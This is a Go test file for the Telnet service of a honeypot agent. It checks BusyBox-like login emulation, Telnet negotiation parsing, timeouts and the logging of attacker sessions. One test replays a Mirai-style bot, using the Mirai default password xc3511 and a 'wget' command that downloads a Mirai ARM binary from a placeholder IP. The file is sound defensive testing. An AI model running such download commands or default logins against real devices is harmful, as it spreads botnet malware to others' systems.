package services

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"strings"
	"testing"
	"time"

	"honeypot-agent/internal/shipper"
)

// readLine: Enter can be "\r\n", "\r\0" or just "\n"; Telnet commands (IAC ...) and NUL bytes
// are dropped, backspace deletes, and a line is cut at telnetMaxLine.
func TestTelnetReadLine(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{"CR LF", "root\r\nadmin\r\n", []string{"root", "admin"}},
		{"CR NUL", "root\r\x00admin\r\x00", []string{"root", "admin"}},
		{"LF only (nc on Linux)", "root\nadmin\n", []string{"root", "admin"}},
		{"empty line", "\r\nroot\r\n", []string{"", "root"}},
		{"backspace and delete", "roox\x08t\r\nadmim\x7fn\r\n", []string{"root", "admin"}},
		{"NUL in the middle", "ro\x00ot\r\n", []string{"root"}},
		{"negotiation first (IAC DO ECHO, IAC WILL SGA)", "\xff\xfd\x01\xff\xfb\x03root\r\n", []string{"root"}},
		{"subnegotiation (IAC SB TTYPE IS xterm IAC SE)", "\xff\xfa\x18\x00xterm\xff\xf0root\r\n", []string{"root"}},
		{"line too long", strings.Repeat("a", telnetMaxLine+10) + "\r\n", []string{strings.Repeat("a", telnetMaxLine)}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			server, client := net.Pipe() // an in-memory connection, no real network
			defer server.Close()
			defer client.Close()
			go client.Write([]byte(tt.input))

			reader := &telnetReader{conn: server, r: bufio.NewReader(server)}
			for _, want := range tt.want {
				got, err := reader.readLine()
				if err != nil || got != want {
					t.Fatalf("got %q, %v (expected %q)", got, err, want)
				}
			}
		})
	}
}

// Regression test for the 15 Nov bug: the Enter after the username arrived split in two packets
// ("root\r", then "\n" + password) and the leftover "\n" was read as an EMPTY password.
// lastCR must be remembered between two readLine calls.
func TestTelnetEnterSplitAcrossPackets(t *testing.T) {
	server, client := net.Pipe()
	defer server.Close()
	defer client.Close()
	reader := &telnetReader{conn: server, r: bufio.NewReader(server)}

	go client.Write([]byte("root\r")) // first packet: the username and only half of Enter
	if got, err := reader.readLine(); err != nil || got != "root" {
		t.Fatalf("username: got %q, %v", got, err)
	}

	go client.Write([]byte("\nxc3511\r\n")) // second packet: the other half, then the password
	if got, err := reader.readLine(); err != nil || got != "xc3511" {
		t.Fatalf("password: got %q, %v (expected xc3511, not an empty line)", got, err)
	}
}

// skipTelnetCommand eats exactly one command (the IAC byte was already read) and nothing after it.
func TestSkipTelnetCommand(t *testing.T) {
	tests := []struct {
		name  string
		input []byte // what follows the IAC byte
	}{
		{"WILL ECHO", []byte{telnetWILL, telnetOptEcho}},
		{"WONT ECHO", []byte{telnetWONT, telnetOptEcho}},
		{"DO terminal type", []byte{telnetDO, 24}},
		{"DONT ECHO", []byte{telnetDONT, telnetOptEcho}},
		{"subnegotiation", []byte{telnetSB, 24, 0, 'x', 't', 'e', 'r', 'm', telnetIAC, telnetSE}},
		{"subnegotiation with IAC IAC inside", []byte{telnetSB, 24, telnetIAC, telnetIAC, 'a', telnetIAC, telnetSE}},
		{"command without option (NOP)", []byte{241}},
	}

	for _, tt := range tests {
		r := bufio.NewReader(bytes.NewReader(append(tt.input, 'X')))
		if err := skipTelnetCommand(r); err != nil {
			t.Errorf("%s: %v", tt.name, err)
			continue
		}
		if next, _ := r.ReadByte(); next != 'X' {
			t.Errorf("%s: skipped too much or too little (next byte: %q, expected 'X')", tt.name, next)
		}
	}

	// a subnegotiation that never ends must give an error, not loop forever
	cut := bufio.NewReader(bytes.NewReader([]byte{telnetSB, 24, 'x', 't'}))
	if err := skipTelnetCommand(cut); err == nil {
		t.Error("cut-off subnegotiation: expected an error")
	}
}

// A whole Telnet session the way a Mirai-style bot does it: wrong password, right password,
// a download command, exit. Checks what the attacker sees and every event that gets logged.
func TestTelnetSession(t *testing.T) {
	var out bytes.Buffer // the JSONL the shipper writes (no URL = stdout copy only)
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)

	readUntil(t, r, "gateway login: ")
	fmt.Fprint(conn, "\r\n") // an empty name: BusyBox login only asks again, no "Password:"
	if text := readUntil(t, r, "gateway login: "); strings.Contains(text, "Password") {
		t.Errorf("after an empty name: %q", text)
	}
	fmt.Fprint(conn, "root\r\n")
	readUntil(t, r, "Password: ")
	fmt.Fprint(conn, "wrong\r\n")
	if text := readUntil(t, r, "gateway login: "); !strings.Contains(text, "Login incorrect") {
		t.Errorf("after a wrong password: %q", text)
	}

	fmt.Fprint(conn, "  root extra\r\n") // like login: leading spaces skipped, the name ends at a space
	readUntil(t, r, "Password: ")
	fmt.Fprint(conn, "xc3511\r\n")
	// Buildroot's BusyBox shell is "quiet": after the password only a new line, then the prompt
	if text := readUntil(t, r, "root@gateway:~# "); !strings.HasSuffix(text, "\r\nroot@gateway:~# ") || strings.Contains(text, "BusyBox") {
		t.Errorf("after login: %q (expected no banner)", text)
	}

	fmt.Fprint(conn, "cd /tmp; wget http://203.0.113.7/bins/mirai.arm7 -O x\r\n")
	if text := readUntil(t, r, "root@gateway:/tmp# "); !strings.Contains(text, "Connection timed out") {
		t.Errorf("wget output: %q", text) // wget never downloads anything
	}
	fmt.Fprint(conn, "exit\r\n")
	waitDone(t, done)

	events := parseEvents(t, out.String())
	checkSession(t, events, "TELNET", 23)

	logins := ofType(events, "login_attempt")
	if len(logins) != 2 {
		t.Fatalf("%d login_attempt events (expected 2)", len(logins))
	}
	if c := logins[0].Credentials; c.Username != "root" || c.Password != "wrong" || c.Success {
		t.Errorf("first login: %+v", c)
	}
	if c := logins[1].Credentials; c.Username != "root" || c.Password != "xc3511" || !c.Success {
		t.Errorf("second login: %+v", c)
	}

	commands := ofType(events, "command_exec")
	if len(commands) != 2 {
		t.Fatalf("%d command_exec events (expected 2: the wget line and exit)", len(commands))
	}
	if p := commands[0].PayloadDetails; p.Command != "cd /tmp; wget http://203.0.113.7/bins/mirai.arm7 -O x" ||
		p.ExtractedURL != "http://203.0.113.7/bins/mirai.arm7" {
		t.Errorf("wget line: %+v", p)
	}
	for _, c := range commands {
		if strings.Contains(c.PayloadDetails.Command, "xc3511") {
			t.Errorf("the password ended up in a command: %q", c.PayloadDetails.Command)
		}
	}
}

// Byte for byte what BusyBox 1.30.1 telnetd + login send: the option negotiation and the banner
// first (Shodan stores exactly these bytes), then the echo of what is typed, except the password,
// and 3s after a wrong password. The bytes are written out here from the sources (telnetd.c,
// libbb/login.c, bb_askpass.c), not taken from our constants.
func TestTelnetLikeBusyBox(t *testing.T) {
	var out bytes.Buffer
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)

	// IAC DO ECHO, IAC DO NAWS, IAC WILL ECHO, IAC WILL SGA, then issue.net through the pty
	want := "\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nGateway Linux 4.14\r\n\rgateway login: "
	if got := readUntil(t, r, "gateway login: "); got != want {
		t.Errorf("greeting: %q\n     want %q", got, want)
	}

	fmt.Fprint(conn, "root\r\n")
	if got := readUntil(t, r, "Password: "); got != "root\r\nPassword: " { // echoed, no option change
		t.Errorf("after the name: %q", got)
	}
	start := time.Now()
	fmt.Fprint(conn, "secret\r\n")
	if got := readUntil(t, r, "gateway login: "); got != "\r\nLogin incorrect\r\ngateway login: " {
		t.Errorf("after a wrong password: %q (the password must not be echoed)", got)
	}
	if took := time.Since(start); took < 3*time.Second {
		t.Errorf("a wrong password was answered after %v (BusyBox: 3s)", took)
	}

	fmt.Fprint(conn, "admin\r\n") // uid 0 too: the prompt says root, $USER who logged in
	readUntil(t, r, "Password: ")
	fmt.Fprint(conn, "admin\r\n")
	readUntil(t, r, "root@gateway:~# ")
	fmt.Fprint(conn, "echo $USER $LOGNAME $TERM\r\n") // TERM: init's, through telnetd and login
	if got := readUntil(t, r, "root@gateway:~# "); got != "echo $USER $LOGNAME $TERM\r\nadmin admin vt102\r\nroot@gateway:~# " {
		t.Errorf("login environment: %q", got)
	}
	fmt.Fprint(conn, "idx\x7f\r\n") // a typo, deleted with backspace
	want = "idx\b \b\r\nuid=0(root) gid=0(root) groups=0(root)\r\nroot@gateway:~# "
	if got := readUntil(t, r, "root@gateway:~# "); got != want {
		t.Errorf("command: %q\n   want %q", got, want)
	}
	fmt.Fprint(conn, "echo \xc3\xa9\r\n") // "é" in UTF-8: the echo must be these same 2 bytes
	want = "echo \xc3\xa9\r\n\xc3\xa9\r\nroot@gateway:~# "
	if got := readUntil(t, r, "root@gateway:~# "); got != want {
		t.Errorf("non-ASCII: %q\n     want %q", got, want)
	}
	fmt.Fprint(conn, "exit\r\n")
	waitDone(t, done)

	events := parseEvents(t, out.String())
	checkSession(t, events, "TELNET", 23)
	if logins := ofType(events, "login_attempt"); len(logins) != 2 || logins[0].Credentials.Password != "secret" {
		t.Errorf("login_attempt events: %+v", logins)
	}
	if commands := ofType(events, "command_exec"); len(commands) < 2 || commands[1].PayloadDetails.Command != "id" {
		t.Errorf("command_exec events: %+v", commands)
	}
}

// A bot that sends its commands all at once gets them answered one by one, 200-300ms apart (pacer),
// so one session can't make hundreds of events a second. None of them is lost.
func TestTelnetCommandsArePaced(t *testing.T) {
	var out bytes.Buffer
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)
	fmt.Fprint(conn, "root\r\nroot\r\n")
	readUntil(t, r, "root@gateway:~# ")

	start := time.Now()
	fmt.Fprint(conn, strings.Repeat("echo x\r\n", 5)+"exit\r\n")  // 6 lines in one write
	all, _ := io.ReadAll(r)                                       // until exit ends the session
	if took := time.Since(start); took < 5*200*time.Millisecond { // the first runs at once, then 5 waits
		t.Errorf("6 commands sent at once took %v (expected at least 1s)", took)
	}
	if n := strings.Count(string(all), "\r\nx\r\n"); n != 5 { // each output after the echoed "echo x\r\n"
		t.Errorf("%d outputs (expected 5): %q", n, all)
	}
	waitDone(t, done)
	if n := len(ofType(parseEvents(t, out.String()), "command_exec")); n != 6 {
		t.Errorf("%d command_exec events (expected 6)", n)
	}
}

// Like BusyBox login: all the tries together must be done within 60s (500ms here), whatever the
// client sends meanwhile (here an empty name every 100ms). Then its message, and the end.
func TestTelnetLoginTimeout(t *testing.T) {
	old := telnetLoginTimeout
	telnetLoginTimeout = 500 * time.Millisecond
	t.Cleanup(func() { telnetLoginTimeout = old })

	var out bytes.Buffer
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	start := time.Now()
	go func() {
		for range telnetMaxEmptyNames - 1 { // 900ms of empty names, fewer than BusyBox's limit of 10
			time.Sleep(100 * time.Millisecond)
			if _, err := fmt.Fprint(conn, "\r\n"); err != nil {
				return
			}
		}
	}()
	all, _ := io.ReadAll(conn) // until the server hangs up
	if took := time.Since(start); took > 800*time.Millisecond {
		t.Errorf("the login lasted %v (expected cut after 500ms)", took)
	}
	if !strings.HasSuffix(string(all), "gateway login: \r\r\nLogin timed out after 60 seconds\r\r\n") {
		t.Errorf("got %q", all)
	}
	waitDone(t, done)
	checkSession(t, parseEvents(t, out.String()), "TELNET", 23)

	// after a successful login the limit is gone (alarm(0)): a command after 700ms still runs
	addr, done = serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })
	conn2, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn2.Close()
	conn2.SetDeadline(time.Now().Add(5 * time.Second))
	r := bufio.NewReader(conn2)
	fmt.Fprint(conn2, "root\r\nroot\r\n")
	readUntil(t, r, "root@gateway:~# ")
	time.Sleep(700 * time.Millisecond)
	fmt.Fprint(conn2, "whoami\r\n")
	if got := readUntil(t, r, "root@gateway:~# "); !strings.Contains(got, "root\r\n") {
		t.Errorf("a command after the login's limit: %q", got)
	}
	fmt.Fprint(conn2, "exit\r\n")
	waitDone(t, done)
}

// A line must arrive whole within the idle timeout (300ms here): one byte now and then (here every
// 100ms, never an Enter) doesn't keep the connection, and its place in limit.go, forever.
func TestTelnetTrickleIsCut(t *testing.T) {
	old := telnetIdleTimeout
	telnetIdleTimeout = 300 * time.Millisecond
	t.Cleanup(func() { telnetIdleTimeout = old })

	var out bytes.Buffer
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	r := bufio.NewReader(conn)
	fmt.Fprint(conn, "root\r\nroot\r\n")
	readUntil(t, r, "root@gateway:~# ")

	start := time.Now()
	go func() {
		for range 20 { // 2s of trickling, if nothing cut it
			time.Sleep(100 * time.Millisecond)
			if _, err := conn.Write([]byte("x")); err != nil {
				return
			}
		}
	}()
	io.ReadAll(r) // until the server hangs up
	if took := time.Since(start); took > 700*time.Millisecond {
		t.Errorf("one byte every 100ms kept the connection for %v (expected cut after 300ms)", took)
	}
	waitDone(t, done)
	checkSession(t, parseEvents(t, out.String()), "TELNET", 23)
}

// Empty user names only ask again (no "Password:", no login_attempt). The 10th ends the session,
// like BusyBox login (EMPTY_USERNAME_COUNT), so a bot can't keep us busy with empty lines.
func TestTelnetEmptyNames(t *testing.T) {
	var out bytes.Buffer
	s := shipper.NewShipper(&out, "", "")
	addr, done := serveOne(t, func(c net.Conn) { handleTelnet(c, "telnet-test", s) })

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	fmt.Fprint(conn, strings.Repeat("\r\n", telnetMaxEmptyNames))

	all, err := io.ReadAll(conn) // everything until the server hangs up
	if err != nil {
		t.Fatalf("the server did not hang up: %v", err)
	}
	if n := strings.Count(string(all), "gateway login: "); n != telnetMaxEmptyNames || strings.Contains(string(all), "Password") {
		t.Errorf("%d login prompts (expected %d, no Password): %q", n, telnetMaxEmptyNames, all)
	}
	waitDone(t, done)

	events := parseEvents(t, out.String())
	checkSession(t, events, "TELNET", 23)
	if logins := ofType(events, "login_attempt"); len(logins) != 0 {
		t.Errorf("empty names were logged as login attempts: %+v", logins)
	}
}
